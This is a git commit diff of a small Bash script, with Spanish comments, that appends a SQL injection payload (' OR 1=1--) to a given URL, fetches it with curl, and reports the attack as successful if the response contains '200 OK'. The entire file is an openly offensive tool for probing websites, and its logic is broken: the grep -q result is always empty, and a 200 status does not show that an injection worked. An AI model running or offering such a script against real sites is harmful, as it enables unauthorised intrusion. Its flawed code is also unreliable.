a512ef38864bf453bc913ece37e26abb3346c2ea
Jose-Paco <99270056+Jose-Paco@users.noreply.github.com>
2022-05-10 17:46:24 +0200

    Update sqli.sh

--- sqli.sh
+++ sqli.sh
@@ -1,14 +1,15 @@
-#!/bin/bash
 sqli() {
 #preparamos las variables
-URL=$(echo -e "$url")
+URL=$(echo "$url")
 SQLi="%27+OR+1=1--"
-ATTACK="$URL$SQLi"
+ATTACK=$URL$SQLi
 #si el ataque funciona
-if [ curl -i "$ATTACK" | grep "200 OK" ]
+bellota=$(curl -s -i "$ATTACK" | grep -q "200 OK")
+echo $bellota
+if [ -n "$bellota" ]
 then
 #muestrame por pantalla una url con el resultado
-  echo -e "Haz clic en el siguiente enlace para ver el resultado del ataque: \n$ATTACK"
+  echo "Haz clic en el siguiente enlace para ver el resultado del ataque: $ATTACK"
 else
 #si no funciona muestra este mensaje de error y cierra el programa
   echo "Disculpa, el ataque no ha funcionado."
